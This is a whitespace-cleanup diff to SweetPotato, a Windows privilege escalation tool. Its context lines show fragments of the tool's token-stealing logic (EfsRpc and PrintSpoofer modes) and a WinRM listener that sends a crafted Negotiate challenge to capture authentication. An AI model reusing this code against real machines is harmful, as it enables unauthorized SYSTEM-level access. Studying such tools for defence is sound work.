@@ -41,7 +41,7 @@ namespace SweetPotato {
                     return efsRpc.Token;
                 } else {
                     return printSpoofer.Token;
-                }   
+                }
             }
         }
 
@@ -66,7 +66,7 @@ namespace SweetPotato {
                 case Mode.PrintSpoofer:
                     printSpoofer = new PrintSpoofer();
                     break;
-            }                         
+            }
         }
 
         public Thread StartWinRMThread() {
@@ -95,7 +95,7 @@ namespace SweetPotato {
                 return null;
             }
 
-            return matches[0].Groups["neg"].Value;           
+            return matches[0].Groups["neg"].Value;
         }
 
         void WinRMListener() {
@@ -127,14 +127,14 @@ namespace SweetPotato {
                 Console.Write("[!] Failed to parse SPNEGO Base64 buffer");
                 return;
             }
-                        
+
             string challengeResponse = String.Format(
                 "HTTP/1.1 401 Unauthorized\n" +
                 "WWW-Authenticate: Negotiate {0}\n" +
                 "Content-Length: 0\n" +
                 "Connection: Keep-Alive\n\n",
                 Convert.ToBase64String(negotiator.Challenge)
-                ); 
+                );
 
             clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));
             authHeader = GetAuthorizationHeader(clientSocket);
@@ -208,7 +208,7 @@ namespace SweetPotato {
                     rpcSocket.Close();
                     listenSocket.Close();
                 } finally { }
-                                   
+
             } catch (Exception e) {
                 Console.WriteLine("[!] COM Listener thread failed: {0}", e.Message);
                 readyEvent.Set();
@@ -259,7 +259,7 @@ namespace SweetPotato {
                         }
                         break;
                 }
-          
+
             } catch (Exception e) {
                 if (!negotiator.Authenticated)
                     Console.Write(String.Format("{0}\n", e.Message));
